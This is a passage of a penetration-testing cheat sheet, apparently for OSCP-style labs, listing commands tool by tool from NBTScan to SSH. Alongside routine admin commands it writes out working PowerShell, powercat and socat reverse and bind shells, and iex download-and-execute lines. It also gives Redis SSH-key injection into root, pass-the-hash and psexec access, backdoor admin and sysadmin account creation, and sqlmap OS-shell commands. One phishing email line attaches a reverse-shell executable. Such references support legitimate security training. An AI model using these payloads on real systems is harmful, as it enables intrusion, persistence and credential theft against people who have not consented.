  ```

- **Show Databases**:
  ```sql
  SHOW DATABASES;
  ```

### NBTScan
- **Scan a Network for NetBIOS Names**:
  ```bash
  nbtscan <IP_range>
  ```

- **Scan with Verbose Output**:
  ```bash
  nbtscan -v <IP_range>
  ```
- **Scan a subnet for NetBIOS names using nbtscan**:
  ```bash
  nbtscan -r <IP_range>
  sudo nbtscan -r 10.11.1.0/24
  ```
---
### Nessus
- **Verifying the integrity of the downloaded Nessus package by checking its SHA-256 checksum and installing it**:
  ```bash
  sha256sum Nessus-X.X.X.deb
  sudo apt install ./Nessus-X.X.X.deb
  
  ```

- **Start Nessus Service**:
  ```bash
  systemctl start nessusd
  sudo /etc/init.d/nessusd start
  ```

- **Check Nessus Status**:
  ```bash
  systemctl status nessusd
  ```
---
### Net
- **List Shared Resources**:
  ```cmd
  net share
  ```

- **Stop a Service**:
  ```cmd
  net stop <service_name>
  ```
- **Creating a New User:**:
  ```cmd
  net user /add tester password
  ```

- **Listing Local Groups:**:
  ```cmd
  net localgroup
  ```
- **Adding User to Administrators Group:**:
  ```cmd
  net localgroup Administrators tester /add
  ```

- **Removing User from Administrators Group:**:
  ```cmd
  net localgroup Administrators tester /del
  ```
- **Listing Account Policies:**:
  ```cmd
  net accounts
  ```

- **Accessing Shared Network Resource:**:
  ```cmd
  net use \\192.168.1.1\public
  ```
- **Stopping and Starting Windows Search Service:**:
  ```cmd
  net stop WSearch
  net start WSearch
  ```

- **Changing User Password:**:
  ```cmd
  net user admin Ev!lpass
  ```
- **Post Exploitation: Adding a New User to RDP and admin group:**:
  ```cmd
  net user test-user tester /add
  net localgroup administrators /add tester
  net localgroup "Remote Desktop Users" /add tester
  ```

---
### Netsh
- **Show Wireless Profiles**:
  ```cmd
  netsh wlan show profiles
  ```

- **Export a Wireless Profile**:
  ```cmd
  netsh wlan export profile name="<profile_name>" key=clear folder=<output_folder>
  ```
- **Viewing the firewall settings for all profiles (Domain, Private, Public):**:
  ```cmd
  netsh advfirewall show allprofiles
  ```

- **Add Firewall Rules: Blocking incoming ping requests from a specific IP**:
  ```cmd
  netsh advfirewall firewall add rule name="Deny Ping OffSec" dir=in action=block protocol=icmpv4 remoteip=192.124.249.5
  ```
- **Showing a specific rule:**:
  ```cmd
  netsh advfirewall firewall show rule name="Deny Ping OffSec"
  ```

- **Deleting a specific rule:**:
  ```cmd
  netsh advfirewall firewall delete rule name="Deny Ping OffSec"
  ```
- **Blocking outbound traffic to a specific IP:**:
  ```cmd
  netsh advfirewall firewall add rule name="Block OffSec" remoteip=192.124.249.5 dir=out enable=yes action=block
  ```

- **Block outbound TCP traffic to a specific IP and port (443):**:
  ```cmd
  netsh advfirewall firewall add rule name="Block OffSec" remoteip=192.124.249.5 dir=out enable=yes action=block remoteport=443 protocol=tcp
  ```
- **Local Port Forwarding Using netsh and Listing/Mounting the remote share available on the Windows 2016 Server machine through a port forward and**:
  ```cmd
  netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
  sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Tester,password=password /mnt/win10_share ls -l /mnt/win10_share/ 
  smbclient -L 10.11.0.22 --port=4455 --user=Administrator
  ```
  This command forwards traffic that is sent to port 4455 on 10.11.0.22 to port 445 on 192.168.1.110
- ** Allowing Inbound Traffic on a Specific Port**:
  ```cmd
  netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
  ```

---
### Netstat
- **Show All Connections**:
  ```bash
  netstat -a
  ```

- **Show Listening Ports**:
  ```bash
  netstat -l
  ```

- **Show Connections by Process**:
  ```bash
  netstat -p
  ```
- **The command displays listening TCP/UDP ports, the processes using them, and more detailed connection info.**:
  ```bash
  netstat -tulpen
  ```

- ** This command will display TCP and UDP connections along with their respective states and the processes responsible for them.**:
  ```bash
  netstat -natup
  ```

---
### Nslookup
- **Query an IP Address**:
  ```bash
  nslookup <hostname>
  ```

- **Set a Different DNS Server**:
  ```bash
  nslookup <hostname> <DNS_server>
  ```
- **Example: Running nslookup to query the SRV record for LDAP services on a Domain Controller**:
  ```bash
  C:\Windows\system32>nslookup
  nslookup
  DNS request timed out.
      timeout was 2 seconds.
  Default Server:  UnKnown
  Address:  10.5.5.30
  
  > set type=all
  > _ldap._tcp.dc._msdcs.sandbox.local
  Server:  UnKnown
  Address:  10.5.5.30
  
  _ldap._tcp.dc._msdcs.sandbox.local      SRV service location:
            priority       = 0
            weight         = 100
            port           = 389
            svr hostname   = SANDBOXDC.sandbox.local
  SANDBOXDC.sandbox.local internet address = 10.5.5.30
  > exit
  
  C:\Windows\system32>
  ```
---
### OneSixtyOne
- **Scan SNMP Devices**:
  ```bash
  onesixtyone -c <community_string_list> <IP_range>
  ```

- **Use a Specific Community String**:
  ```bash
  onesixtyone -s <community_string> <IP_range>
  ```
- **Create a file named 'community' containing SNMP community strings, generate IP addresses and Use the onesixtyone tool to scan the IPs**:
  ```bash
  echo public > community
  echo private >> community
  echo manager >> community
  for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
  onesixtyone -c community -i ips
  ```
---
### OpenSSL
- **Generate a Private Key**:
  ```bash
  openssl genpkey -algorithm RSA -out private.key
  ```

- **Create a Self-Signed Certificate**:
  ```bash
  openssl req -x509 -new -key private.key -out cert.pem -days 365
  ```
- ** Generate a hashed password using OpenSSL and a custom salt for user authentication**:
  ```bash
  openssl passwd -1 -salt test pass123
  ```
---
### Passwd
- **Change Your Password**:
  ```bash
  passwd
  ```

- **Change Password for Another User**:
  ```bash
  sudo passwd <username>
  ```
- **Check the status of the user 'tester' (e.g., account locked, password status, etc.)**:
  ```bash
  passwd --status tester
  ```

- **Display password aging and account expiration information for the user 'tester'**:
  ```bash
  chage -l jane
  ```
---
### PHPGGC
- **Generate a PHP Gadget Chain**:
  ```bash
  phpggc <gadget> -o <output_file>
  ```

- **List Available Gadget Chains**:
  ```bash
  phpggc -l
  ```
- ** Generate a PHP payload using PHPGGC for Symfony Remote Code Execution (RCE4) to execute a command**:
  ```bash
  phpggc Symfony/RCE4 exec 'cat /home/tester/secret.txt' | base64
  ```
---
### Plink
- **Initiate an SSH Connection**:
  ```bash
  plink -ssh <username>@<host>
  ```

- **Execute a Command on a Remote Host**:
  ```bash
  plink -ssh <username>@<host> <command>
  ```
- **Setting up remote port forwarding on a remote host using Plink**:
  ```bash
  plink.exe -ssh -l tester -pw password -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
  ```

- **Establishing a remote tunnel using Plink in non-interactive mode**:
  ```bash
  cmd.exe /c echo y | plink.exe -ssh -l user -pw password -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
  ```
---
### Powercat
- **Start a Listener**:
  ```powershell
  powercat -l -p <port> -t <protocol>
  ```

- **Send a File**:
  ```powershell
  powercat -c <host> -p <port> -i <file>
  ```
- **File Transfer with Powercat:**:
  ```powershell
  powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
  sudo nc -lnvp 443 > receiving_powercat.ps1
  ```

- **Reverse Shell with Powercat:**:
  ```powershell
  powercat -c 10.11.0.4 -p 443 -e cmd.exe
  sudo nc -lvp 443
  ```
- **Bind Shell with Powercat:**:
  ```powershell
  powercat -l -p 443 -e cmd.exe
  nc 10.11.0.22 443
  ```

- **Generating Powercat Stand-Alone Payloads:**:
  ```powershell
  powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
  ./reverseshell.ps1
  ```
- **Creating an Encoded Stand-Alone Payload:**:
  ```powershell
  powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
  ```
- **Executing an Encoded Stand-Alone Payload:**:
  ```powershell
  powershell.exe -E <Encoded-Payload>
  ./reverseshell.ps1
  ```

### PowerShell
- **Run a Script**:
  ```powershell
  powershell -File <script.ps1>
  ```

- **Execute a Command**:
  ```powershell
  powershell -Command "<command>"
  ```
- **Download Tools(Powercat) using PowerShell**:
  ```powershell
  powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
  iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/whoami.exe', 'C:\Users\Public\whoami.exe')

  ```
  iex executes the downloaded PowerShell script.
- **Run a Script**:
  ```powershell
  powershell -File <script.ps1>
  ```
- **PowerShell Execution Policy**:
  ```powershell
  Set-ExecutionPolicy Unrestricted
  Get-ExecutionPolicy
  ```
- **Remote PowerShell Sessions**:
  ```powershell
  $dcsesh = New-PSSession -Computer SANDBOXDC
  Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}
  ```
- **File Transfers**:
  ```powershell
  Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
  ```
- **Reverse Shell One-Liner**:
  ```powershell
  powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  ```
- **Persistent Reverse Shell**:
  ```powershell
  $client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
  $stream = $client.GetStream();
  [byte[]]$bytes = 0..65535|%{0};
  while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
  {
      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
      $sendback = (iex $data 2>&1 | Out-String );
      $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
      $stream.Write($sendbyte,0,$sendbyte.Length);
      $stream.Flush();
  }
  $client.Close();
  ```
- **Bind Shell**:
  ```powershell
  powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
  ```
- **File Extraction and Archive Handling**:
  ```powershell
  Expand-Archive -Path .\PSTools.zip -DestinationPath C:\Windows\System32\
  ```
- **PowerShell Enumeration**:
  ```powershell
  echo $PSVersionTable
  Get-Command -Noun file
  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status
  Get-Service | Get-Member
  Get-Service | Select-Object -Property "DisplayName","MachineName","ServiceType","StartType","Status"
  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending
  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object StartType -EQ Automatic
  Get-Service | Select-Object -Property DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object StartType -EQ Automatic | Format-List
  Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"}
  Get-Service | Select-Object -Property ServiceName,DisplayName,ServiceType,StartType,Status | Sort-Object -Property Status -Descending | Where-Object {$_.StartType -EQ "Automatic" -And $_.ServiceName -Match "^s"} | Format-Table

  ```
- **PowerShell Remote Access**:
  ```powershell
  Enable-PSRemoting
  Invoke-Command -ComputerName 192.168.50.80 -ScriptBlock { ipconfig } -Credential offensive

  ```
- **Set Trusted Hosts**:
  ```powershell
  Set-Item wsman:\localhost\client\trustedhosts 192.168.50.80

  ```
- **Run a new cmd.exe process with elevated privileges**:
  ```powershell
  powershell.exe Start-Process cmd.exe -Verb runAs

  ```
- **Execute a script:**:
  ```powershell
  powershell.exe -exec bypass C:\Users\vandelay\Desktop\computerInfo.ps1

  ```
- **Miscellaneous PowerShell Commands**:
  ```powershell
  Get-Verb
  Get-Help Get-Help
  Get-Alias
  Get-Module -ListAvailable
  Get-Help Start-MpScan
  Start-MpScan -ScanPath 'C:\\Users\\User\\' -ScanType QuickScan

  ```

---
### PsExec
- **Execute a Command on a Remote Host**:
  ```cmd
  psexec \\<host> -u <username> -p <password> <command>
  psexec \\192.168.50.80 -u tester -p password ipconfig
  ```
- **Run Interactive Shell**:
  ```cmd
  psexec \\<host>
  ```
- **Running Command on Specific User Session:**:
  ```cmd
  psexec -i \\myComputer cmd /c "systeminfo"
  ```

- **Running Command as Different User:**:
  ```cmd
  psexec -i \\myComputer -u username -p password cmd
  ```
- **onnecting to Domain Controller (DC/Windows)**:
  ```cmd
  .\PsExec.exe /accepteula \\dc01 cmd.exe
  ```

- **Running Impacket PsExec Example**:
  ```cmd
  /usr/bin/impacket-psexec "username:password"@192.168.205.59 cmd.exe
  ```
- **Gaining System Shell Using Impacket:**:
  ```cmd
  python3 /usr/share/doc/python3-impacket/examples/psexec.py pc.domain/tester:password@192.168.120.116
  /usr/share/doc/python3-impacket/examples/psexec.py admin@10.129.254.45
  ```

### PTH-Winexe
- **Run a Command with Pass-the-Hash**:
  ```bash
  pth-winexe -U <domain>/<username>%<hash> //<target_ip> <command>
  ```
- **Using pth-winexe to pass the hash and execute a command on a remote Windows machine**:
  ```bash
  pth-winexe -U tester%aad3b435b5dsdfsdfb435b51404ee:2892d26csdfdsfb9f05c425e //10.11.0.22 cmd
  ```
### Python
- **Run a Python Script**:
  ```bash
  python <script.py>
  ```

- **Start Python Interactive Shell**:
  ```bash
  python
  ```
- **Run a Python Script**:
  ```bash
  python <script.py>
  ```

- **Start Python Interactive Shell**:
  ```bash
  python
  ```
- **Run a Python Script**:
  ```bash
  python <script.py>
  ```

- **Start Python Interactive Shell**:
  ```bash
  python
  ```

### Recon-ng
- **Start Recon-ng Framework**:
  ```bash
  recon-ng
  ```

- **Searching the Marketplace for Modules(GitHub):**:
  ```bash
  marketplace search github
  ```
- **Getting Information on a Module:**:
  ```bash
  marketplace info recon/domains-hosts/google_site_web
  ```

- **Load a Module**:
  ```bash
  use <module>
  modules load recon/domains-hosts/google_site_web
  ```
- **Installing a Module**:
  ```bash
  marketplace install recon/domains-hosts/google_site_web
  ```

- **#Using recon/domains-hosts/google_site_web and setting the source**:
  ```bash
  modules load recon/domains-hosts/google_site_web
  info
  options set SOURCE megacorpone.com
  ```


### Redis
- **Connect to Redis CLI**:
  ```bash
  redis-cli
  ```

- **Flush All Data**:
  ```bash
  redis-cli FLUSHALL
  ```
- **Injecting SSH Public Key into Redis**:
  ```bash
  ssh-keygen -t rsa
  (echo -e "\n\n"; cat key.pub ; echo -e "\n\n") > key.txt
  cat key.txt | redis-cli -h 127.0.0.1 -a 'sgm5ZgaRCTOE6QpyCojpyr+Rix12VYbdOkA' -x set s-key
  
  ```

- **Update Redis Configuration to Allow SSH Key Injection:**:
  ```bash
  redis-cli -h 127.0.0.1 -a 'sgm5ZgaRCTOE6QpyCojpyr+Rix12VYbdOkA' 
  127.0.0.1:6379> config get dir
  2) "/var/redis/6379"
  127.0.0.1:6379> config set dir /root/.ssh
  OK
  127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
  OK
  127.0.0.1:6379> save
  OK
  --> exit
  ssh root@192.168.120.51 -i key
  ```

### Reg
- **Query a Registry Key**:
  ```cmd
  reg query <key_path>
  ```

- **Add a Registry Key**:
  ```cmd
  reg add <key_path> /v <value_name> /t <type> /d <data>
  ```
- **Query the "RunOnce" key in the registry for current user (HKCU)**:
  ```cmd
  reg query hkcu\software\microsoft\windows\currentversion\runonce
  ```

- **Query the "Run" key in the registry for current user (HKCU)**:
  ```cmd
  reg query hkcu\software\microsoft\windows\currentversion\run
  ```
- **Delete all values under the "Run" key for the current user (HKCU)**:
  ```cmd
  reg delete hkcu\software\microsoft\windows\currentversion\run /va
  ```

- **Add a new entry to the "Run" key for the current user (HKCU)**:
  ```cmd
  reg add hkcu\software\microsoft\windows\currentversion\run /v OneDrive /t REG_SZ /d "C:\Users\Offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe"
  ```
- **Export the "Environment" key for the current user (HKCU) to a file**:
  ```cmd
  reg export hkcu\environment environment
  ```

### Responder
- **Start Responder**:
  ```bash
  responder -I <interface>
  sudo responder -I tap0
  ```

- **Run in Analysis Mode**:
  ```bash
  responder -I <interface> -A
  ```
- **Running Responder on the 'eth0' interface in verbose mode**:
  ```bash
  responder -I eth0 -rv
  ```
- **Running Responder on our active network interface to capture NTLMv2 handshakes**:
  ```bash
  responder -I eth0 
  curl http://192.168.120.91:8080/?url=http://our-ip
  ```
   It's often used in situations like Server-Side Request Forgery (SSRF) attacks, where an attacker can make a server request another service or system within the same 
   network.
### Rinetd
- ** Update package lists and install rinetd from the Kali Linux repositories**:
  ```bash
  sudo apt update && sudo apt install rinetd
  ```

- **Add Port Forwarding Rule**:
  ```bash
  echo "<bind_ip> <bind_port> <target_ip> <target_port>" >> /etc/rinetd.conf
  ```
- **Add a port forwarding rule to the rinetd configuration file (/etc/rinetd.conf)**:
  ```bash
  cat /etc/rinetd.conf
  0.0.0.0 80 216.58.207.142 80
  ```

- **Restart Rinetd**:
  ```bash
  systemctl restart rinetd
  ```

- **Restart Rinetd**:
  ```bash
  systemctl restart rinetd
  ```

### Rlwrap
- **Wrap a Command with Readline**:
  ```bash
  rlwrap <command>
  ```

- **Specify History File**:
  ```bash
  rlwrap -H <history_file> <command>
  ```
- **Use rlwrap with netcat (nc) for a better reverse shell experience**:
  ```bash
  rlwrap -cAr nc -lvnp 443
  ```

### Rpcclient
- **Connect to an SMB Server**:
  ```bash
  rpcclient -U <username> <target_ip>
  ```

- **Enumerate Users**:
  ```bash
  enumdomusers
  ```
- ** List the user accounts on the domain using rpcclient(anonymous login)**:
  ```bash
  rpcclient -W '' -c querydispinfo -U ''%'' '192.168.155.175'
  ```

### RSMangler
- **Generate Wordlists**:
  ```bash
  rsmangler --file <input_file> -o <output_file>
  ```

- **Use Custom Rules**:
  ```bash
  rsmangler --file <input_file> --rules
  ```
- **Using RSMangler to generate permutations of the wordlist**:
  ```bash
  echo bird > wordlist.txt
  echo cat >> wordlist.txt
  echo dog >> wordlist.txt
  rsmangler --file wordlist.txt
  ```
- **Saving the Mangled Output to a File**:
  ```bash
  rsmangler --file wordlist.txt --output mangled.txt
  ```
- **Piping a wordlist into RSMangler**:
  ```bash
  cat wordlist.txt | rsmangler --file -
  ```
- **Mangling Wordlist with Character Limits**:
  ```bash
  rsmangler --file wordlist.txt --min 12 --max 13
  ```
- **Combining RSMangler with Aircrack-ng**:
  ```bash
  rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w -
  ```
### Runas
- **Run a Program as Another User**:
  ```cmd
  runas /user:<username> "<command>"
  ```

- **Use Password Prompt**:
  ```cmd
  runas /user:<username> /savecred "<command>"
  ```
- **Running the command without loading the user's profile (no environment variables from the profile are set)**:
  ```cmd
  runas /noprofile /user:mymachine\tester cmd
  ```

### SC
- **Query Service Status**:
  ```cmd
  sc query <service_name>
  ```

- **Start a Service**:
  ```cmd
  sc start <service_name>
  sc start WSearch
  ```
- **Query Service Status**:
  ```cmd
  sc query <service_name>
  sc query dhcp
  ```

- **Configuring the Windows Search service to start automatically**:
  ```cmd
  sc config WSearch start=auto
  ```
  
### Schtasks
- **Create a Scheduled Task**:
  ```cmd
  schtasks /create /tn <task_name> /tr <command> /sc <schedule> /st <start_time>
  ```

- **Delete a Scheduled Task**:
  ```cmd
  schtasks /delete /tn <task_name>
  ```
- **Create a scheduled task named "runme" to run the program "C:\runme.exe" every Monday at 9:00 AM**:
  ```cmd
  schtasks /create /sc weekly /d mon /tn runme /tr C:\runme.exe /st 09:00
  ```
- **Delete the scheduled task named "runme"**:
  ```cmd
  schtasks /delete /tn runme
  ```
- **Recreate the scheduled task named "runme" with the same configuration (weekly, every Monday, 9:00 AM)**:
  ```cmd
  schtasks /create /sc weekly /d mon /tn runme /tr C:\runme.exe /st 09:00
  ```
- ** Query details of the scheduled task named "runme" and display the output in list format**:
  ```cmd
  schtasks /query /TN runme /fo LIST
  ```

### SCP
- **Copy a File to a Remote Server**:
  ```bash
  scp <file> <username>@<host>:<remote_path>
  ```

- **Copy a File from a Remote Server**:
  ```bash
  scp <username>@<host>:<remote_file> <local_path>
  scp -P 2222 tester@192.168.166.52:/challenge/flag.txt /tmp/flag.txt
  ```
- **Copy a File to a Remote Server**:
  ```bash
  scp <file> <username>@<host>:<remote_path>
  scp -r /home/mindsflee/test.txt kali@192.168.49.124:/tmp/test.txt
  ```

### Sed
- **Replace Text in a File**:
  ```bash
  sed -i 's/<old_text>/<new_text>/g' <file>
  ```

- **Print Specific Lines**:
  ```bash
  sed -n '<line_number>p' <file>
  ```
  
- **Update the UID in the /etc/passwd file**:
  ```bash
  sudo sed -i -e 's/1001/1014/g' /etc/passwd
  ```
  This command replaces all occurrences of the UID '1001' with '1014' in the /etc/passwd file.
### SendEmail
- **Send an Email**:
  ```bash
  sendEmail -f <from_address> -t <to_address> -u <subject> -m <message> -s <smtp_server> -xu <username> -xp <password>
  ```

- **Attach a File**:
  ```bash
  sendEmail -f <from_address> -t <to_address> -u <subject> -m <message> -s <smtp_server> -a <file_path>
  ```
- **Send an email with an attachment using the sendEmail tool**:
  ```bash
  sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.177.55 -u "Important urgent patch Upgrade Instructions" -a /tmp/windows_reverse.exe
  ```

### SharpHound
- **Collect Data for BloodHound**:
  ```cmd
  SharpHound.exe -c All
  ```
  This is useful for gathering comprehensive information about the target environment’s attack surface in Active Directory.
- **Compress Output Files**:
  ```cmd
  SharpHound.exe -c All --zip
  ```

### Shellter
- **Run Shellter in Automatic Mode**:
  ```bash
  shellter -a
  ```

- **Specify Input and Output Files**:
  ```bash
  shellter -a -f <input_exe> -o <output_exe>
  ```

### Smbclient
- **Connect to an SMB Share(Windows/Linux)**:
  ```bash
  smbclient //<server>/<share>
  smbclient //192.168.120.116/DocumentsShare -U username
  smbclient -U 'username%password' //192.168.155.175/Password\ Audit
  smbclient \\\\10.129.255.88\\backups -U user

  ```

- **Listing SMB Shares**:
  ```bash
  smbclient -L <target_ip> -U <username>
  smbclient -L \\192.168.155.175 -U 'username%password'
  smbclient -N -L 192.168.120.116
  ```
- **Updating SMB Protocol to SMBv2**:
  ```bash
  sudo nano /etc/samba/smb.conf
  min protocol = SMB2
  sudo /etc/init.d/smbd restart
  
  ```

- **Recursive File Download with SMB**:
  ```bash
  smbclient -U 'username%password' //192.168.155.175/Password\ Audit
  smb: \> prompt off
  smb: \> recurse on
  smb: \> mget *
  ```
- **Uploading a Web Shell and Executables**:
  ```bash
    smbclient -U 'username%password' //192.168.155.175/Password\ Audit
    smb: \> put shell.php
    smb: \> put nc.exe
    smb: \> exit
  ```

- **Download a File**:
  ```bash
  get <file_name>
  ```
- **Connect to an SMB Share**:
  ```bash
  smbclient //<server>/<share>
  ```

- **Download a File**:
  ```bash
  get <file_name>
  ```

### Snmpwalk
- **Query an SNMP Device**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address>
  ```

- **Specify an OID: Enumerate open TCP ports on the target using SNMP**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
  snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
  ```
- **Enumerate the entire MIB tree on the target using SNMPv1**:
  ```bash
  snmpwalk -c public -v1 -t 10 10.11.1.14
  ```
- **Enumerate Windows users on the target using SNMP**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
  snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
  ```
  1.3.6.1.4.1.77.1.2.25: OID (Object Identifier) for listing Windows user accounts.
- **Enumerate installed software on the target using SNMP**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
  snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
  ```

- **Enumerate running Windows processes on the target using SNMP**:
  ```bash
  snmpwalk -v <version> -c <community_string> <IP_address> <OID>
  snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
  ```

### Socat
- **Connecting to a Remote Server on Port 80**:
  ```bash
  socat - TCP4:<remote server's ip address>:80
  ```

- **Creating a Listener**:
  ```bash
  sudo socat TCP4-LISTEN:443 STDOUT
  ```
- **Create a Reverse Shell**:
  ```bash
  socat TCP:<target_host>:<port> EXEC:/bin/bash
  socat -d -d TCP4-LISTEN:443 STDOUT
  ```
- **Sending a Reverse Shell**:
  ```bash
  socat TCP4:10.11.0.22:443 EXEC:/bin/bash
  ```

- **Forward a Port**:
  ```bash
  socat TCP-LISTEN:<local_port>,fork TCP:<target_host>:<target_port>
  ```
- **Transferring a File**:
  ```bash
  sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
  socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
  ```

- **Setting Up Encrypted Shells**:
  ```bash
  openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 30 -out bind_shell.crt
  cat bind_shell.key bind_shell.crt > bind_shell.pem
  ```
- **Creating Encrypted Bind Shell**:
  ```bash
  sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
  ```

- **Connecting to the Encrypted Bind Shell**:
  ```bash
  socat - OPENSSL:192.168.22.31:443,verify=0 id
  ```

### Spose
- **Running Spose to check for open ports behind the proxy**:
  ```bash
  python3 spose.py --proxy http://192.168.120.223:3128 --target 127.0.0.1
  ```

### Sqlmap
- **Scan a URL for SQL Injection**:
  ```bash
  sqlmap -u <url>
  ```

- **Specify a POST Request**:
  ```bash
  sqlmap -u <url> --data="<POST_data>"
  ```
- **Basic SQL injection test using sqlmap**:
  ```bash
  sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
  ```

- **Using sqlmap to dump the entire database**:
  ```bash
  sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump --level=3 --risk=3
  ```
  - **Using sqlmap to gain an OS shell on the target server**:
  ```bash
  sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
  ```

### Sqsh
- **Start a Session**:
  ```bash
  sqsh -S <server> -U <username> -P <password>
  ```
- **Basic Syntax:Using Windows Authentication (Local User):**:
  ```bash
  sqsh -S <IP> -U <Username> -P <Password> -D <Database>
  sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
  ```
- **Running SQL Queries:**:
  ```bash
  sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
  1> SELECT 1;
  2> GO
  ```

- **Useful SQL Commands for Enumeration and Reconnaissance**:
  ```bash
  1> SELECT user_name();
  2> GO
  1> SELECT @@version;
  2> GO
  1> SELECT name FROM master.dbo.sysdatabases;
  2> GO
  1> USE master;
  2> GO
  1> SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
  2> GO
  ```
- **List Linked Servers:**:
  ```bash
  1> EXEC sp_linkedservers;
  2> GO
  1> SELECT * FROM sys.servers;
  2> GO
  ```

- **Listing Users and Login Details:**:
  ```bash
  1> SELECT sp.name AS login, sp.type_desc AS login_type, sl.password_hash, 
       sp.create_date, sp.modify_date, 
       CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS status 
  FROM sys.server_principals sp 
  LEFT JOIN sys.sql_logins sl 
  ON sp.principal_id = sl.principal_id 
  WHERE sp.type NOT IN ('G', 'R') 
  ORDER BY sp.name;
  2> GO
  ```
- ** Privilege Escalation: Creating a User with sysadmin**:
  ```bash
  1> CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
  2> GO
  1> sp_addsrvrolemember 'hacker', 'sysadmin';
  2> GO
  ```

### SSH
- **Connect to a Server**:
  ```bash
  ssh <username>@<host>
  ```

- **Run a Command Remotely**:
  ```bash
  ssh <username>@<host> <command>
  ssh tester@10.11.1.101 'nc 192.168.119.174 443 -e /bin/bash'
  ```
- **SSH Local Port Forwarding**:
  ```bash
  ssh -N -L [bind_address:]port:host:hostport [username@address]
  sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 tester@10.11.0.128
  sudo ssh -N -L 0.0.0.0:445:Win-goal-ip:445 tester@victim-vm-ip
  
  ```

- **SSH Remote Port Forwarding**:
  ```bash
  ssh -N -R [bind_address:]port:host:hostport [username@address]
  ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
  ssh -R 5555:localhost:5555 tester@192.168.166.52 -p 2222 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
  
  ```
- **SSH Dynamic Port Forwarding (SOCKS Proxy)**:
  ```bash
  cat /etc/proxychains.conf --> add -->
  [ProxyList]
  # add proxy here ...
  # meanwhile
  # defaults set to "tor"
  socks4 127.0.0.1 8080
  ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
  sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
